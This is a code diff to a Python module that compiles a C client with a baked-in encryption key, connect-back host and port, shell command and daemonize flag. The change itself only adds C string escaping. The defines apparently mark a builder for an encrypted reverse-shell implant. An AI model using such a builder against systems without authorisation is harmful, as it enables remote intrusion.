@@ -12,6 +12,14 @@ CLIENT_SOURCE = Path(__file__).parent / "client.c"
 logger = logging.getLogger(__name__)
 
 
+def _c_string_escape(s: str) -> str:
+    return '"{}"'.format(
+        "".join(
+            c if c.isascii() and c not in ('"', "\\") else f"\\x{ord(c):02x}" for c in s
+        )
+    )
+
+
 async def compile_client(
     encryption_key: str,
     host: tuple[str, int],
@@ -25,11 +33,12 @@ async def compile_client(
         raise ValueError("Encryption key must be ASCII")
 
     hostname, port = host
+
     defines = {
-        "ENCRYPTION_KEY": repr(encryption_key),
-        "CONNECT_HOST": repr(hostname),
+        "ENCRYPTION_KEY": _c_string_escape(encryption_key),
+        "CONNECT_HOST": _c_string_escape(hostname),
         "CONNECT_PORT": port,
-        "SHELL_COMMAND": repr(shell_command),
+        "SHELL_COMMAND": _c_string_escape(shell_command),
         "BUFFER_LENGTH": buffer_length,
         "DAEMONIZE": 1,
     }
